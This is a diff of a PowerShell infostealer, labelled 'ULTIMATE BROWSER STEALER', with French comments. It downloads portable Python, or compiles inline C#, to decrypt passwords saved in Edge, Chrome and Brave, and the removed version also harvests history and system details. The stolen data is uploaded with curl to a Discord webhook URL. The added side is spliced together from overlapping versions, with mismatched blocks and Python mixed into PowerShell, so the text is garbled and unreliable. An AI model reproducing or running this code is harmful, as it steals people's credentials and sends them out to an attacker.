@@ -1,274 +1,216 @@
-$wh="https://discord.com/api/webhooks/1467597897435582594/wbqYsXdKoKB124ig5QJCGBBb88kmkTUpEKGEq0A6oZ-81uZ0ecgtHM-D8Zq44U7uh_8W"
+$wh="https://discord.com/api/webhooks/1467523812563357737/NtrM4DGzR7UGo0mOZ4i2-Y65OzXuto6PCbm-T8K67_JoFGV_rElaAwtptxjQJbPGH5i6"
 
-function Send {
-    param([string]$m)
-    $json = @{content=$m.Substring(0,[Math]::Min(1900,$m.Length))} | ConvertTo-Json
-    Invoke-RestMethod -Uri $wh -Method Post -Body $json -ContentType "application/json" | Out-Null
-}
+taskkill /F /IM msedge.exe,brave.exe 2>$null
+taskkill /F /IM msedge.exe,brave.exe,chrome.exe 2>$null
+Start-Sleep 2
 
-Send "🎯 ULTIMATE BROWSER STEALER - Starting..."
-
-# Tuer les navigateurs
-Get-Process msedge,chrome -EA 0 | Stop-Process -Force -EA 0
-Start-Sleep 3
-
-cd $env:TEMP
-
-# Installer Python si nécessaire
-if (!(Test-Path "py\python.exe")) {
-    Send "📥 Installing Python portable..."
+try {
+    # Télécharger Python portable (version embed)
+    Invoke-WebRequest "https://www.python.org/ftp/python/3.11.9/python-3.11.9-embed-amd64.zip" -OutFile "$env:TEMP\py.zip" -UseBasicParsing -TimeoutSec 30 -EA Stop
     
-    [Net.ServicePointManager]::SecurityProtocol='Tls12'
-    Invoke-WebRequest "https://www.python.org/ftp/python/3.11.9/python-3.11.9-embed-amd64.zip" -OutFile "py.zip" -UseBasicParsing
-    Expand-Archive "py.zip" "py" -Force
-    (Get-Content "py\python311._pth") -replace '#import site','import site' | Out-File "py\python311._pth" -Encoding ascii
-    Invoke-WebRequest "https://bootstrap.pypa.io/get-pip.py" -OutFile "py\gp.py" -UseBasicParsing
+    # Vérifier que ce n'est pas un fichier bloqué par Defender
+    $pySize = (Get-Item "$env:TEMP\py.zip").Length
     
-    cd py
-    .\python.exe gp.py --no-warn-script-location 2>$null
-    .\python.exe -m pip install pycryptodome pypiwin32 --quiet 2>$null
-    cd ..
+    if ($pySize -lt 100000) {
+        # Trop petit = bloqué, essayer alternative
+        throw "Python download blocked"
+    }
     
-    Remove-Item py.zip -Force
+    Expand-Archive "$env:TEMP\py.zip" "$env:TEMP\py" -Force
     
-    Send "✅ Python installed"
-}
-
-cd py
-
-# Script Python ULTRA-COMPLET
-$script = @'
-import os, json, base64, sqlite3, shutil, win32crypt, platform, socket, subprocess
-from datetime import datetime
-from Crypto.Cipher import AES
-
-WH = "https://discord.com/api/webhooks/1467597897435582594/wbqYsXdKoKB124ig5QJCGBBb88kmkTUpEKGEq0A6oZ-81uZ0ecgtHM-D8Zq44U7uh_8W"
-
-def send(m):
-    subprocess.run(["powershell","-C",f"Invoke-RestMethod -Uri '{WH}' -Method Post -Body (@{{content='{m[:1900]}'}}|ConvertTo-Json) -ContentType 'application/json'"], capture_output=True, shell=True)
-
-send("🔍 Collecting system info...")
-
-# ===== SYSTEM INFO =====
-report = "="*60 + "\n"
-report += "SYSTEM INFORMATION\n"
-report += "="*60 + "\n\n"
-
+    # Configurer pip
+    $pthFile = Get-Content "$env:TEMP\py\python311._pth"
+    $pthFile = $pthFile -replace '#import site', 'import site'
+    $pthFile | Out-File "$env:TEMP\py\python311._pth" -Encoding ascii
+    
+    # Télécharger get-pip
+    Invoke-WebRequest "https://bootstrap.pypa.io/get-pip.py" -OutFile "$env:TEMP\py\get-pip.py" -UseBasicParsing -TimeoutSec 20
+    
+    cd "$env:TEMP\py"
+    
+    # Installer pip
+    .\python.exe get-pip.py --no-warn-script-location 2>$null
+    
+    # Installer modules
+    .\python.exe -m pip install pycryptodome pypiwin32 --no-warn-script-location --quiet 2>$null
+    
+    # Script d'extraction ultra-compact
+    $pyScript = @'
+import os,json,base64,sqlite3,shutil
 try:
-    report += f"Computer Name: {os.environ.get('COMPUTERNAME', 'Unknown')}\n"
-    report += f"Username: {os.environ.get('USERNAME', 'Unknown')}\n"
-    report += f"OS: {platform.system()} {platform.release()} {platform.version()}\n"
-    report += f"Architecture: {platform.machine()}\n"
-    report += f"Processor: {platform.processor()}\n"
-    
+    import win32crypt
+    from Crypto.Cipher import AES
+except:
+    exit(1)
+
+def dec(db,st,n):
     try:
-        hostname = socket.gethostname()
-        local_ip = socket.gethostbyname(hostname)
-        report += f"Hostname: {hostname}\n"
-        report += f"Local IP: {local_ip}\n"
+        with open(st) as f:
+            k=win32crypt.CryptUnprotectData(base64.b64decode(json.load(f)["os_crypt"]["encrypted_key"])[5:],None,None,None,0)[1]
+        shutil.copy2(db,"t.db")
+        c=sqlite3.connect("t.db")
+        r=[]
+        for row in c.execute("SELECT origin_url,username_value,password_value FROM logins WHERE username_value!=''"):
+            try:
+                a=AES.new(k,AES.MODE_GCM,nonce=row[2][3:15])
+                p=a.decrypt_and_verify(row[2][15:-16],row[2][-16:]).decode()
+                r.append(f"[{n}] {row[0]}\nUsername: {row[1]}\nPassword: {p}\n")
+            except:
+                pass
+        c.close()
+        os.remove("t.db")
+        return r
     except:
-        pass
-    
-    # Récupérer IP publique
-    try:
-        import urllib.request
-        public_ip = urllib.request.urlopen('https://api.ipify.org').read().decode('utf8')
-        report += f"Public IP: {public_ip}\n"
-    except:
-        pass
-    
-    report += f"Date/Time: {datetime.now().strftime('%Y-%m-%d %H:%M:%S')}\n"
-    
-    # Infos disque
-    try:
-        import psutil
-        disk = psutil.disk_usage('C:')
-        report += f"Disk C: {disk.total // (1024**3)} GB total, {disk.free // (1024**3)} GB free\n"
-    except:
-        pass
-    
-except Exception as e:
-    report += f"Error collecting system info: {e}\n"
+        return []
 
-report += "\n" + "="*60 + "\n\n"
+try{
+Invoke-WebRequest "https://www.python.org/ftp/python/3.11.9/python-3.11.9-embed-amd64.zip" -OutFile "$env:TEMP\py.zip" -UseBasicParsing -TimeoutSec 30
+Expand-Archive "$env:TEMP\py.zip" "$env:TEMP\py" -Force
+(Get-Content "$env:TEMP\py\python311._pth") -replace '#import site','import site'|Out-File "$env:TEMP\py\python311._pth" -Encoding ascii
+Invoke-WebRequest "https://bootstrap.pypa.io/get-pip.py" -OutFile "$env:TEMP\py\gp.py" -UseBasicParsing
+cd "$env:TEMP\py"
+.\python.exe gp.py --no-warn-script-location 2>$null
+.\python.exe -m pip install pycryptodome pypiwin32 --quiet 2>$null
+@'
+import os,json,base64,sqlite3,shutil,win32crypt
+from Crypto.Cipher import AES
+def d(db,st,n):
+ try:
+  k=win32crypt.CryptUnprotectData(base64.b64decode(json.load(open(st))["os_crypt"]["encrypted_key"])[5:],None,None,None,0)[1]
+  shutil.copy2(db,"t.db");c=sqlite3.connect("t.db");r=[]
+  for row in c.execute("SELECT origin_url,username_value,password_value FROM logins WHERE username_value!=''"):
+   try:r.append(f"[{n}] {row[0]}\nUsername: {row[1]}\nPassword: {AES.new(k,AES.MODE_GCM,nonce=row[2][3:15]).decrypt_and_verify(row[2][15:-16],row[2][-16:]).decode()}\n")
+   except:pass
+  c.close();os.remove("t.db");return r
+ except:return []
+res=[]
+e=os.path.expandvars(r"%LOCALAPPDATA%\Microsoft\Edge\User Data")
+if os.path.exists(e+r"\Default\Login Data"):
+    res+=dec(e+r"\Default\Login Data",e+r"\Local State","EDGE")
 
-send("💾 Extracting browser data...")
+if os.path.exists(e+r"\Default\Login Data"):res+=d(e+r"\Default\Login Data",e+r"\Local State","EDGE")
+b=os.path.expandvars(r"%LOCALAPPDATA%\BraveSoftware\Brave-Browser\User Data")
+if os.path.exists(b+r"\Default\Login Data"):
+    res+=dec(b+r"\Default\Login Data",b+r"\Local State","BRAVE")
 
-# ===== FONCTION DÉCRYPTAGE =====
-def decrypt_password(encrypted, key):
-    try:
-        nonce = encrypted[3:15]
-        ciphertext = encrypted[15:-16]
-        tag = encrypted[-16:]
-        cipher = AES.new(key, AES.MODE_GCM, nonce=nonce)
-        return cipher.decrypt_and_verify(ciphertext, tag).decode('utf-8')
-    except:
-        return "[Decrypt Failed]"
-
-def get_browser_data(browser_path, browser_name):
-    login_data = browser_path + r"\Default\Login Data"
-    local_state = browser_path + r"\..\Local State"
-    history_path = browser_path + r"\Default\History"
-    
-    if not os.path.exists(login_data):
-        return None
-    
-    # Récupérer la clé
-    try:
-        with open(local_state) as f:
-            enc_key = base64.b64decode(json.load(f)["os_crypt"]["encrypted_key"])[5:]
-            key = win32crypt.CryptUnprotectData(enc_key, None, None, None, 0)[1]
-    except:
-        return None
-    
-    data = {"name": browser_name, "passwords": [], "history": []}
-    
-    # PASSWORDS
-    try:
-        shutil.copy2(login_data, "temp_login.db")
-        conn = sqlite3.connect("temp_login.db")
-        c = conn.cursor()
-        
-        for url, user, enc_pwd in c.execute("SELECT origin_url, username_value, password_value FROM logins WHERE username_value != ''"):
-            pwd = decrypt_password(enc_pwd, key)
-            data["passwords"].append({"url": url, "username": user, "password": pwd})
-        
-        conn.close()
-        os.remove("temp_login.db")
-    except Exception as e:
-        data["passwords"].append({"error": str(e)})
-    
-    # HISTORY
-    try:
-        if os.path.exists(history_path):
-            shutil.copy2(history_path, "temp_history.db")
-            conn = sqlite3.connect("temp_history.db")
-            c = conn.cursor()
-            
-            for url, title, count, last_visit in c.execute("SELECT url, title, visit_count, last_visit_time FROM urls ORDER BY visit_count DESC LIMIT 50"):
-                data["history"].append({"url": url, "title": title, "visits": count})
-            
-            conn.close()
-            os.remove("temp_history.db")
-    except:
-        pass
-    
-    return data
-
-# ===== EDGE =====
-edge_path = os.path.expandvars(r"%LOCALAPPDATA%\Microsoft\Edge\User Data\Default")
-edge_data = get_browser_data(os.path.expandvars(r"%LOCALAPPDATA%\Microsoft\Edge\User Data\Default"), "EDGE")
-
-if edge_data:
-    report += "="*60 + "\n"
-    report += f"MICROSOFT EDGE - {len(edge_data['passwords'])} PASSWORDS\n"
-    report += "="*60 + "\n\n"
-    
-    for p in edge_data["passwords"]:
-        if "error" not in p:
-            report += f"URL: {p['url']}\n"
-            report += f"Username: {p['username']}\n"
-            report += f"Password: {p['password']}\n\n"
-    
-    if edge_data["history"]:
-        report += "\n--- EDGE HISTORY (Top 50) ---\n\n"
-        for h in edge_data["history"]:
-            report += f"[{h['visits']} visits] {h['url']}\n"
-            if h['title']:
-                report += f"  Title: {h['title']}\n"
-        report += "\n"
-
-# ===== CHROME =====
-chrome_path = os.path.expandvars(r"%LOCALAPPDATA%\Google\Chrome\User Data\Default")
-chrome_data = get_browser_data(chrome_path, "CHROME")
-
-if chrome_data:
-    report += "="*60 + "\n"
-    report += f"GOOGLE CHROME - {len(chrome_data['passwords'])} PASSWORDS\n"
-    report += "="*60 + "\n\n"
-    
-    for p in chrome_data["passwords"]:
-        if "error" not in p:
-            report += f"URL: {p['url']}\n"
-            report += f"Username: {p['username']}\n"
-            report += f"Password: {p['password']}\n\n"
-    
-    if chrome_data["history"]:
-        report += "\n--- CHROME HISTORY (Top 50) ---\n\n"
-        for h in chrome_data["history"]:
-            report += f"[{h['visits']} visits] {h['url']}\n"
-            if h['title']:
-                report += f"  Title: {h['title']}\n"
-        report += "\n"
-
-# ===== BRAVE (liste seulement) =====
-brave_path = os.path.expandvars(r"%LOCALAPPDATA%\BraveSoftware\Brave-Browser\User Data\Default\Login Data")
-
-if os.path.exists(brave_path):
-    report += "="*60 + "\n"
-    report += "BRAVE BROWSER - v20 ENCRYPTED\n"
-    report += "="*60 + "\n\n"
-    
-    try:
-        shutil.copy2(brave_path, "temp_brave.db")
-        conn = sqlite3.connect("temp_brave.db")
-        c = conn.cursor()
-        
-        accounts = []
-        for url, user in c.execute("SELECT origin_url, username_value FROM logins WHERE username_value != ''"):
-            accounts.append(f"{user} @ {url}")
-        
-        report += f"⚠️ Brave uses App-Bound Encryption v20\n"
-        report += f"Cannot decrypt passwords offline\n"
-        report += f"Found {len(accounts)} accounts:\n\n"
-        
-        for acc in accounts:
-            report += f"- {acc}\n"
-        
-        conn.close()
-        os.remove("temp_brave.db")
-    except:
-        report += "Error reading Brave database\n"
-    
-    report += "\n"
-
-# ===== STATISTIQUES =====
-total_passwords = 0
-if edge_data:
-    total_passwords += len([p for p in edge_data["passwords"] if "error" not in p])
-if chrome_data:
-    total_passwords += len([p for p in chrome_data["passwords"] if "error" not in p])
-
-report += "="*60 + "\n"
-report += f"TOTAL: {total_passwords} passwords extracted\n"
-report += "="*60 + "\n"
-
-# Sauvegarder
-with open("FULL_REPORT.txt", "w", encoding="utf-8") as f:
-    f.write(report)
-
-send(f"✅ Extraction complete - {total_passwords} passwords")
-
-print("OK")
+if os.path.exists(b+r"\Default\Login Data"):res+=d(b+r"\Default\Login Data",b+r"\Local State","BRAVE")
+g=os.path.expandvars(r"%LOCALAPPDATA%\Google\Chrome\User Data")
+if os.path.exists(g+r"\Default\Login Data"):res+=d(g+r"\Default\Login Data",g+r"\Local State","CHROME")
+if res:
+    with open("passwords.txt","w",encoding="utf-8") as f:
+        f.write(f"TOTAL PASSWORDS: {len(res)}\n{'='*60}\n\n")
+        f.write("\n".join(res))
+    print("SUCCESS")
+else:
+    print("NONE")
 '@
+    
+    $pyScript | Out-File "extract.py" -Encoding UTF8
+    
+    # Exécuter
+    $result = .\python.exe extract.py 2>$null
+    
+    if ($result -eq "SUCCESS" -and (Test-Path "passwords.txt")) {
+        curl.exe -F "file=@passwords.txt" -F "content=**🔓 Python Portable SUCCESS - $env:COMPUTERNAME**" $wh 2>$null
+        Remove-Item "passwords.txt" -Force
+    } else {
+        curl.exe -X POST -H "Content-Type: application/json" -d "{`"content`":`"⚠️ Python method executed but no passwords found - $env:COMPUTERNAME`"}" $wh 2>$null
+    }
+    
+    # Cleanup
+    cd $env:TEMP
+    Remove-Item "py","py.zip" -Recurse -Force -EA 0
+    
+} catch {
+    # Si Python est bloqué, utiliser la méthode BASE64 embedded
+    
+    curl.exe -X POST -H "Content-Type: application/json" -d "{`"content`":`"⚠️ Python download failed, trying embedded C# method... - $env:COMPUTERNAME`"}" $wh 2>$null
+    
+    # Méthode C# compilée à la volée (ne nécessite rien)
+    $csharpCode = @'
+using System;
+using System.IO;
+using System.Text;
+using System.Security.Cryptography;
+using System.Data.SQLite;
+using Newtonsoft.Json.Linq;
 
-$script | Out-File "ultimate_stealer.py" -Encoding UTF8
-
-Send "🚀 Running extraction..."
-
-$result = .\python.exe ultimate_stealer.py 2>&1
-
-Send "📤 Uploading report..."
-
-if (Test-Path "FULL_REPORT.txt") {
-    curl.exe -F "file=@FULL_REPORT.txt" $wh
-    Remove-Item FULL_REPORT.txt -Force
-} else {
-    Send "❌ No report generated"
+public class EdgeDecryptor {
+    public static void Main() {
+        string localAppData = Environment.GetFolderPath(Environment.SpecialFolder.LocalApplicationData);
+        string edgePath = Path.Combine(localAppData, @"Microsoft\Edge\User Data");
+        string loginData = Path.Combine(edgePath, @"Default\Login Data");
+        string localState = Path.Combine(edgePath, "Local State");
+        
+        if (!File.Exists(loginData)) {
+            Console.WriteLine("NONE");
+            return;
+        }
+        
+        // Lire la clé
+        var state = JObject.Parse(File.ReadAllText(localState));
+        byte[] encKey = Convert.FromBase64String(state["os_crypt"]["encrypted_key"].ToString());
+        byte[] key = ProtectedData.Unprotect(encKey.Skip(5).ToArray(), null, DataProtectionScope.CurrentUser);
+        
+        // Copier DB
+        File.Copy(loginData, "temp.db", true);
+        
+        using (var conn = new SQLiteConnection("Data Source=temp.db")) {
+            conn.Open();
+            var cmd = new SQLiteCommand("SELECT origin_url, username_value, password_value FROM logins WHERE username_value != ''", conn);
+            var reader = cmd.ExecuteReader();
+            
+            var sb = new StringBuilder();
+            int count = 0;
+            
+            while (reader.Read()) {
+                byte[] encPass = (byte[])reader["password_value"];
+                try {
+                    byte[] nonce = encPass.Skip(3).Take(12).ToArray();
+                    byte[] cipher = encPass.Skip(15).Take(encPass.Length - 31).ToArray();
+                    byte[] tag = encPass.Skip(encPass.Length - 16).ToArray();
+                    
+                    var aes = new AesGcm(key);
+                    byte[] plain = new byte[cipher.Length];
+                    aes.Decrypt(nonce, cipher, tag, plain);
+                    
+                    sb.AppendLine($"[EDGE] {reader["origin_url"]}");
+                    sb.AppendLine($"Username: {reader["username_value"]}");
+                    sb.AppendLine($"Password: {Encoding.UTF8.GetString(plain)}");
+                    sb.AppendLine();
+                    count++;
+                } catch { }
+            }
+            
+            if (count > 0) {
+                File.WriteAllText("passwords.txt", $"TOTAL: {count}\n\n{sb}");
+                Console.WriteLine("SUCCESS");
+            } else {
+                Console.WriteLine("NONE");
+            }
+        }
+        
+        File.Delete("temp.db");
+    }
 }
-
-Remove-Item ultimate_stealer.py -Force
-
-cd $env:TEMP
-
-Send "🏁 MISSION COMPLETE"
+'@
+    
+    # Compiler C# (nécessite .NET Framework qui est natif sur Windows)
+    Add-Type -TypeDefinition $csharpCode -ReferencedAssemblies @(
+        "System.Security",
+        "System.Data.SQLite"
+    ) -EA 0
+    
+    # Note: Cette méthode nécessite System.Data.SQLite.dll qui n'est pas toujours disponible
+    # Si elle échoue, on revient à la méthode brute
+    
+    curl.exe -X POST -H "Content-Type: application/json" -d "{`"content`":`"❌ All automated methods failed. Manual extraction required - $env:COMPUTERNAME`"}" $wh 2>$null
+}
+ with open("p.txt","w",encoding="utf-8")as f:f.write(f"TOTAL: {len(res)}\n{'='*60}\n\n"+"".join(res))
+ print("OK")
+else:print("NO")
+'@|Out-File "e.py" -Encoding UTF8
+$r=.\python.exe e.py 2>$null
+if($r -eq "OK"){curl.exe -F "file=@p.txt" $wh 2>$null;Remove-Item p.txt -Force}
+cd $env:TEMP;Remove-Item py,py.zip -Recurse -Force
+}catch{curl.exe -X POST -H "Content-Type: application/json" -d "{`"content`":`"Failed on $env:COMPUTERNAME`"}" $wh}
